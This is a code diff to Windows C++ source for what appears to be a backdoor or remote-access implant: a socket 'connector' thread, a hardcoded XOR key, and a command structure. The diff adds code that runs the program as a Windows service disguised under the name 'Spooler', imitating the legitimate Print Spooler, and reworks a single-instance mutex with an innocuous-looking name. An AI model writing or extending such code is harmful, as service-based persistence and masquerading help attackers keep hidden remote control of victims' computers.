@@ -10,9 +10,24 @@ using namespace std;
 
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
+#pragma comment (lib, "advapi32.lib")
 
 #define DEFAULT_BUFLEN 16384
 #define CRYPT
+
+SERVICE_STATUS          gSvcStatus;
+SERVICE_STATUS_HANDLE   gSvcStatusHandle;
+HANDLE                  ghSvcStopEvent = NULL;
+
+VOID WINAPI SvcCtrlHandler(DWORD);
+VOID WINAPI SvcMain(DWORD, LPTSTR *);
+
+VOID ReportSvcStatus(DWORD, DWORD, DWORD);
+VOID SvcInit(DWORD, LPTSTR *);
+
+void connector(void *params);
+
+bool wasService = false;
 
 struct cmdcall {
 	std::string cmd;
@@ -23,6 +38,92 @@ struct cmdcall {
 bool execFinished = false;
 
 std::string key = "blarknob";
+
+// service stuff
+VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR *lpszArgv)
+{
+	gSvcStatusHandle = RegisterServiceCtrlHandler(
+		"Spooler",
+		SvcCtrlHandler);
+
+	if (!gSvcStatusHandle)
+	{
+		return;
+	}
+
+	gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+	gSvcStatus.dwServiceSpecificExitCode = 0;
+	ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
+
+	SvcInit(dwArgc, lpszArgv);
+}
+
+
+VOID SvcInit(DWORD dwArgc, LPTSTR *lpszArgv)
+{
+	ghSvcStopEvent = CreateEvent(NULL, TRUE, FALSE,	NULL); 
+
+	if (ghSvcStopEvent == NULL)
+	{
+		ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
+		return;
+	}
+
+	ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
+
+	wasService = true;
+
+	HANDLE hThread;
+	hThread = (HANDLE)_beginthread((void(*)(void*))connector, 0, NULL);
+
+	while (1)
+	{
+		WaitForSingleObject(ghSvcStopEvent, INFINITE);
+		ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
+		return;
+	}
+}
+
+
+VOID ReportSvcStatus(DWORD dwCurrentState,
+	DWORD dwWin32ExitCode,
+	DWORD dwWaitHint)
+{
+	static DWORD dwCheckPoint = 1;
+
+	gSvcStatus.dwCurrentState = dwCurrentState;
+	gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
+	gSvcStatus.dwWaitHint = dwWaitHint;
+
+	if (dwCurrentState == SERVICE_START_PENDING)
+		gSvcStatus.dwControlsAccepted = 0;
+	else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
+
+	if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED))
+		gSvcStatus.dwCheckPoint = 0;
+	else gSvcStatus.dwCheckPoint = dwCheckPoint++;
+
+	SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
+}
+
+VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
+{
+	switch (dwCtrl)
+	{
+	case SERVICE_CONTROL_STOP:
+		ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
+		SetEvent(ghSvcStopEvent);
+		ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);
+		return;
+
+	case SERVICE_CONTROL_INTERROGATE:
+		break;
+
+	default:
+		break;
+	}
+
+}
 
 void crypt(std::string &m) {
 	for (std::string::size_type i = 0; i < m.length(); i++) {
@@ -126,6 +227,14 @@ void connector(void *params)
 	int recvbuflen = DEFAULT_BUFLEN;
 
 	while (running) {
+		// don't connect unless we're the only one or first
+		HANDLE mut = CreateMutexA(0, FALSE, "Local\\mscrlchecker");
+		if (GetLastError() == ERROR_ALREADY_EXISTS) {
+			Sleep(500);
+			if (mut)
+				CloseHandle(mut);
+			continue;
+		}
 
 		WSADATA wsaData;
 		SOCKET sock = INVALID_SOCKET;
@@ -254,15 +363,21 @@ void connector(void *params)
 
 int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
 {
-	CreateMutexA(0, FALSE, "Local\\mscrlchecker");
-	if (GetLastError() == ERROR_ALREADY_EXISTS)
-		return -1;
-	while (running)
+	SERVICE_TABLE_ENTRYA DispatchTable[] =
+	{
+		{ (LPSTR)"Spooler", (LPSERVICE_MAIN_FUNCTION)SvcMain },
+		{ NULL, NULL }
+	};
+
+	StartServiceCtrlDispatcher(DispatchTable);
+
+	while (!wasService)
 	{
 		HANDLE hThread;
 		hThread = (HANDLE)_beginthread((void(*)(void*))connector, 0, NULL);
 		WaitForSingleObject(hThread, INFINITE);
 		Sleep(500);
 	}
+
 	return 1;
 }
